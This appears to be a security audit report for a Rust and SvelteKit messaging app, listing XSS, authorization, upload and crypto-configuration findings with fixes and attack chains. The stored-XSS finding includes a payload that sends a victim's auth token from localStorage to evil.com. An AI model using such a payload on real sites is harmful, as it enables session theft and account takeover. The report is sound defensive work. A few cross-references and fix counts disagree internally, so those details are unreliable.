# Oceana Security Audit Report

**Date:** 2026-03-18
**Scope:** Full-stack application (Rust/Axum backend, SvelteKit frontend)
**Method:** Manual code review, red team assessment

---

## Summary

| Severity | Count | Fixed |
|----------|-------|-------|
| CRITICAL | 4 | 2 |
| HIGH | 7 | 3 |
| MEDIUM | 10 | 5 |
| LOW | 6 | 0 |
| INFO | 5 | — |
| **Total** | **32** | **10** |

---

## CRITICAL

### C1. Stored XSS — SSR renders unsanitized HTML

**File:** `frontend/src/lib/components/Markdown.svelte:88-89`

DOMPurify is skipped entirely on the server-side rendering path. Raw markdown-to-HTML output is rendered via `{@html}` with zero sanitization.

```js
} else {
    sanitized = raw; // SSR: NO SANITIZATION
}
```

**Exploit:** Post `<img src=x onerror="fetch('https://evil.com/?t='+localStorage.getItem('auth'))">`. On SSR-rendered page load, the script executes before client hydration.

**Fix:** Use `isomorphic-dompurify` or a server-compatible sanitizer. Never render raw HTML on any path.

---

### C2. Stored XSS — Post-sanitization embed injection

**File:** `frontend/src/lib/components/Markdown.svelte:84-95`

DOMPurify runs first, then embed `<iframe>` HTML is re-injected via string replacement *after* sanitization, bypassing it entirely.

```js
sanitized = DOMPurify.sanitize(raw, { ADD_TAGS: ['iframe'], ... });
// Then embeds injected AFTER sanitization:
return sanitized.replace(/<div data-embed="(\d+)"><\/div>/g, (_, idx) => {
    return embed ? embed.html : '';
});
```

**Fix:** Run DOMPurify *after* embed replacement, or construct embed elements via DOM API.

---

### C3. ~~Permissive CORS allows cross-origin exploitation~~ FIXED

**Status:** Remediated. `CORS_ORIGIN` is now required (backend panics if not set). No `Any` fallback exists. Explicit origin, methods, and headers are configured.

---

### C4. ~~Hardcoded seed user passwords~~ FIXED

**Status:** Remediated. Seed data is now gated behind `SEED_DATA=true` environment variable. Only loaded when explicitly enabled.

---

## HIGH

### H1. No membership check on typing events

**File:** `backend/src/routes.rs:662-687`

`handle_typing` does not verify the sender is a conversation member, unlike `handle_send_message`. Any authenticated user can inject typing indicators into any conversation and enumerate membership.

**Fix:** Add the same membership check used in `handle_send_message`.

---

### H2. Arbitrary user injection into conversations

**File:** `backend/src/routes.rs:401-409`

`create_conversation` does not validate that participant UUIDs exist or that consent is given. Any user can force any other user into a conversation.

**Fix:** Validate participant existence; require mutual follow or consent.

---

### H3. ~~JWT token in WebSocket query string~~ FIXED

**Status:** Remediated. WebSocket now uses ticket-based auth: `POST /ws/ticket` returns a one-time UUID ticket (30s expiry), which is passed in the URL instead of the JWT. Tickets are consumed on use.

---

### H4. Email leaked via unauthenticated user endpoint

**File:** `backend/src/routes.rs:109-119`, `backend/src/models.rs:8-18`

`GET /users/:id` requires no authentication and returns the full `User` struct including `email`. Password hash is skipped, but email is not.

**Fix:** Add `#[serde(skip_serializing)]` to email, or create a public profile DTO.

---

### H5. ~~OPK exhaustion DoS on Signal key bundles~~ PARTIALLY FIXED

**Status:** Partially remediated. OPKs are now only consumed when the requester shares a conversation with the target user. General rate limiting (60/min) also applies. Per-requester rate limiting for key bundle fetches is still not implemented.

---

### H6. Migration errors silently swallowed

**File:** `backend/src/main.rs:51`

```rust
sqlx::query(stmt).execute(&db).await.ok();
```

Failed schema migrations are silently ignored, potentially leaving the database without security constraints.

**Fix:** Log errors; fail startup on critical migration failures.

---

### H7. Unauthenticated user profile endpoint

**File:** `backend/src/routes.rs:109-119`

`get_user` has no `AuthUser` extractor. Anyone can enumerate all user profiles.

**Fix:** Require authentication or return a limited public profile.

---

## MEDIUM

### M1. ~~No rate limiting on any endpoint~~ FIXED

**Status:** Remediated. Per-IP rate limiting is implemented via custom `RateLimiter` middleware using `DashMap`. Limits: auth 5/min, uploads 10/min, general 60/min. Returns 429 on excess.

---

### M2. ~~Upload reads full body before size check~~ FIXED

**Status:** Remediated. `DefaultBodyLimit::max(11 * 1024 * 1024)` is now applied at the middleware layer, rejecting oversized requests before they're fully read into memory.

---

### M3. ~~Unbounded WebSocket connections per user~~ FIXED

**Status:** Remediated. WebSocket connections are capped at 5 per user. When a 6th connection opens, the oldest is dropped.

---

### M4. Plaintext stored alongside ciphertext

**File:** `backend/src/routes.rs:620-631`

The message table accepts both `plaintext` and `ciphertext` simultaneously. For "encrypted" conversations, plaintext may still be stored server-side.

**Fix:** Reject messages containing both; for encrypted conversations, only store ciphertext.

---

### M5. No magic-byte validation on uploads

**File:** `backend/src/routes.rs:491-493`

Only the client-provided `Content-Type` header is checked. An attacker can upload HTML/SVG as `image/jpeg`.

**Fix:** Validate file magic bytes (first few bytes). Add `X-Content-Type-Options: nosniff`.

---

### M6. ~~Missing `X-Content-Type-Options: nosniff` on uploads~~ FIXED

**Status:** Remediated. `X-Content-Type-Options: nosniff` is set globally via security headers middleware on all responses, including uploads.

---

### M7. No email format validation

**File:** `backend/src/routes.rs:61-66`

Arbitrary strings accepted as email addresses.

**Fix:** Validate email format server-side.

---

### M8. ~~Unbounded `bio` length~~ FIXED

**Status:** Remediated. Bio is validated to max 500 characters server-side in `update_profile`.

---

### M9. Token in localStorage (XSS-exfiltrable)

**File:** `frontend/src/lib/stores/auth.ts:28`

JWT stored in `localStorage` is accessible to any JS on the page. Combined with XSS findings, tokens are trivially stolen.

**Fix:** Use `httpOnly` cookies for token storage.

---

### M10. Path traversal — backslash not blocked

**File:** `backend/src/routes.rs:717-723`

Only `/` and `..` are blocked in upload filenames. On Windows, `\` is also a path separator.

**Fix:** Whitelist pattern: allow only `[a-f0-9-]+\.(jpg|png|gif|webp)`.

---

## LOW

### L1. JWT uses HS256 (symmetric signing)

**File:** `backend/src/auth.rs:28`

If the secret leaks, anyone can forge tokens. Asymmetric algorithms (ES256) are preferred.

---

### L2. No refresh token mechanism

1-hour expiry with no refresh flow. Users must re-login frequently.

---

### L3. Weak password policy

Only minimum 8 characters enforced. No complexity requirements.

---

### L4. Argon2 default (low) parameters

**File:** `backend/src/auth.rs:79-81`

Intentionally weak for dev speed. Must be tuned for production.

---

### L5. No CSRF protection

Mitigated by Bearer token auth (not cookies), but becomes exploitable if session-based auth is added.

---

### L6. No pagination on conversation listing

`list_conversations` returns all conversations with no limit.

---

## INFO

| # | Finding |
|---|---------|
| I1 | Debug logging enabled by default (`main.rs:23`) |
| I2 | Server binds `0.0.0.0:3000` — all interfaces (`main.rs:71`) |
| I3 | Upload directory at filesystem root `/uploads` (`main.rs:63`) |
| I4 | No HTTPS enforcement — relies on reverse proxy |
| I5 | JWT error details leaked to client (`error.rs:38-40`) |

---

## Attack Chains

### Chain 1: Full account takeover via XSS (partially mitigated)
`C1 (SSR XSS)` + `M9 (localStorage token)` = attacker posts malicious content, steals any viewer's JWT. *C3 (CORS) is now fixed* — cross-origin exploitation is blocked, but same-origin XSS still works.

### Chain 2: ~~Signal protocol degradation~~ MITIGATED
`H5 (OPK exhaustion)` + ~~`M1 (no rate limiting)`~~ = OPKs are now conversation-gated and rate limiting exists. Exhaustion still possible but requires being in a conversation with the target.

### Chain 3: Conversation surveillance
`H6 (typing no auth check)` + `H2 (force user into conversation)` = attacker creates conversation with victim and monitors their activity. *Still open.*

---

## Recommended Priority (Updated)

**Fixed:** C3, C4, H3, H5 (partial), M1, M2, M3, M6, M8

**Remaining priorities:**
1. **Immediate:** Fix C1, C2 (XSS chain still enables account takeover)
2. **This week:** Fix H1, H2, H4, H6, H7 (authorization gaps, information disclosure)
3. **Before production:** Fix remaining MEDIUM findings (M4 plaintext, M7 email, M9 localStorage, M10 path traversal)
4. **Ongoing:** Address LOW/INFO as part of hardening
